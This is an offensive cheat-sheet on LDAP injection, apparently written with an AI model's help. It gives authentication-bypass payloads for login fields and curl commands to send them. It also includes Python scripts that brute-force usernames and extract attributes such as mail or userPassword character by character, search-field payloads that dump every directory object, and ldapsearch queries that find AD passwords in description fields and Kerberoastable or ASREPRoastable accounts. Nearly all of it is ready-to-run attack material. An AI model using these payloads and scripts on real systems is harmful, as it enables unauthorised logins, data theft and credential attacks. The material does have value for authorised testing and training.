# LDAP Injection

#LDAPi #Injection #WebAppAttacks #ActiveDirectory


## What is this?

LDAP query injection via unsanitized input — enables auth bypass, attribute enumeration, and blind data extraction. Common in directory-integrated apps. Pairs with [[SQL Injection]], [[Web Attacks]].


---

## Tools

| Tool | Purpose |
|---|---|
| `Burp Suite` | Intercept login requests, inject LDAP payloads, Intruder with SecLists LDAP wordlist |
| `ldapsearch` | Manual enumeration and auth bypass testing — `ldapsearch -x -H ldap://<target> -b "dc=target,dc=com" "(objectClass=*)"` |
| `ldapdomaindump` | Enumerate AD over LDAP and output HTML/JSON — `ldapdomaindump -u 'domain\user' -p 'pass' <dc-ip>` |
| `Metasploit` | `auxiliary/scanner/ldap/ldap_login` for credential brute-force |
| SecLists | LDAP injection strings — `/usr/share/seclists/Fuzzing/LDAP.Injection.Fuzz.Strings.txt` |

---

## LDAP Filter Basics

```bash
# Standard auth query:
(&(uid=<username>)(password=<password>))

# Operators:
# &  = AND
# |  = OR
# !  = NOT
# *  = wildcard (any value)
# Special chars: ( ) * \ NUL
```

---

## Authentication Bypass

```bash
# Target: (&(uid=<USER>)(password=<PASS>))

# Classic bypass — close the uid filter early, add OR true
# Input username: admin)(&(|
# Input password: anything
# Result: (&(uid=admin)(&(|)(password=anything))
# → uid=admin condition met → logged in as admin

# Wildcard username bypass — match any user
# Input username: *
# Result: (&(uid=*)(password=anything))
# → matches all users → logs in as first user found

# Inject into password field — make password condition always true
# Input password: *)(&
# Result: (&(uid=admin)(password=*)(&))
# → password=* matches any value

# Bypass both fields
# username: *)(|(&
# password: pwd)
# Result: (&(uid=*)(|(&)(password=pwd)))
# → always true

# Common auth bypass payloads to try:
# username field:
#   admin)(&
#   *
#   *)(|(uid=*
#   admin)(&(uid=admin
#   )(|(|

# password field:
#   *
#   *)(&
#   anything
```

```python
# Test via curl
curl -s -X POST "http://<target>/login" -d "username=admin)(%26&password=anything" --data-urlencode "username=admin)(&" --data-urlencode "password=anything"

# application/json body
curl -s -X POST "http://<target>/api/login" -H "Content-Type: application/json" -d '{"username":"admin)(&","password":"anything"}'
```

---

## Enumeration — Valid Usernames

```bash
# Wildcard-based enumeration — does username "a*" exist?
# username: a*)(&
# → (&(uid=a*)(...)
# Success = valid prefix

# Script to enumerate users
for prefix in a b c d e f admin user test root john; do
  resp=$(curl -s -X POST "http://<target>/login" --data-urlencode "username=${prefix}*)(&" --data-urlencode "password=x")
  if echo "$resp" | grep -qv "invalid\|error\|fail"; then
    echo "[+] Prefix '$prefix' matches a valid user"
  fi
done

# Brute force character by character
python3 << 'EOF'
import requests, string

url = "http://<target>/login"
found = ""
chars = string.ascii_lowercase + string.digits + "_-."

while True:
    for c in chars:
        test = found + c
        r = requests.post(url, data={
            "username": f"{test}*)(&",
            "password": "x"
        })
        if "Welcome" in r.text or r.status_code == 302:
            found += c
            print(f"[+] Found: {found}")
            break
    else:
        print(f"[*] Username: {found}")
        break
EOF
```

---

## Attribute Enumeration (Blind)

Extract LDAP attribute values character by character using wildcard matching.

```bash
# Does the user with uid=admin have mail starting with 'a'?
# Filter: (&(uid=admin)(mail=a*))
# If login succeeds → yes

# Enumerate email of admin
python3 << 'EOF'
import requests, string

url = "http://<target>/login"
chars = string.ascii_lowercase + string.digits + "@._-"
found = ""
attr = "mail"   # change to cn, sn, givenName, memberOf, etc.

while True:
    for c in chars:
        test = found + c
        # Inject via second filter: uid=admin)(attr=<test>*)(uid=admin
        payload = f"admin)({attr}={test}*)(uid=admin"
        r = requests.post(url, data={
            "username": payload,
            "password": "x"
        })
        if "Welcome" in r.text or r.status_code == 302:
            found += c
            print(f"[+] {attr}: {found}")
            break
    else:
        print(f"[*] Final {attr}: {found}")
        break
EOF

# Common attributes to enumerate:
# uid, cn, sn, givenName, mail, memberOf, description, telephoneNumber
# userPassword (if stored as plaintext or weak hash)
# department, title, manager
```

---

## OOB / Blind Extraction via Error Differences

```bash
# Time-based isn't common in LDAP — use response differences:
# - Login success vs failure
# - Page content length difference
# - HTTP redirect vs no redirect
# - Error message difference

# Check if user exists at all:
curl -s -X POST "http://<target>/login" --data-urlencode "username=admin" --data-urlencode "password=*" | wc -c
# vs
curl -s -X POST "http://<target>/login" --data-urlencode "username=doesnotexist12345" --data-urlencode "password=*" | wc -c
# Size difference = user exists check
```

---

## LDAP Injection in Search/Filter Fields

When app has search functionality backed by LDAP:

```bash
# Common search injection points:
# ?search=<input>   → (&(cn=*<input>*)(objectClass=user))
# ?user=<input>     → (uid=<input>)

# Wildcard dump — match everything
curl -s "http://<target>/search?q=*" | grep -oP "uid=[^,]+"

# Close filter and add OR to dump all objects
# Input: *)(|(objectClass=*
# Result: (&(cn=**)(|(objectClass=*)(cn=))
curl -s --data-urlencode "search=*)(|(objectClass=*" "http://<target>/search"

# Dump all users
curl -s --data-urlencode "search=)(|(uid=*" "http://<target>/search"

# LDAP injection to access admin records
curl -s --data-urlencode "search=*)(|(memberOf=CN=Admins,DC=corp,DC=local" "http://<target>/search"
```


---

## Active Directory LDAP Specifics

```bash
# AD LDAP filter for all users
(&(objectClass=user)(objectCategory=person))

# AD LDAP injection in Kerberos pre-auth / web apps backed by AD
# Same techniques — inject into search filters

# Password in description (common misconfiguration)
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" -b "dc=<domain>,dc=com" "(&(objectClass=user))" description | grep -i "pass\|pwd\|cred"

# Users with no pre-auth required (ASREPRoastable)
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" -b "dc=<domain>,dc=com" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Kerberoastable users (servicePrincipalName set)
ldapsearch -x -H ldap://<dc-ip> -D "<user>@<domain>" -w "<pass>" -b "dc=<domain>,dc=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
```

---

## Quick Reference

```bash
# Auth bypass payloads (username field)
admin)(&            # close + always-true
*)(&                # wildcard + always-true
*                   # match any user

# Auth bypass (password field)
*                   # match any password
*)(&                # close + always-true

# Enumerate via wildcard
a*)(&               # users starting with 'a'
*admin*)(&          # users containing 'admin'

# LDAP injection fuzz list
/usr/share/seclists/Fuzzing/LDAP-Injection-Fuzzing-Strings.txt
```

---

*Created: 2026-03-04*
*Updated: 2026-05-13*
*Model: claude-sonnet-4-6*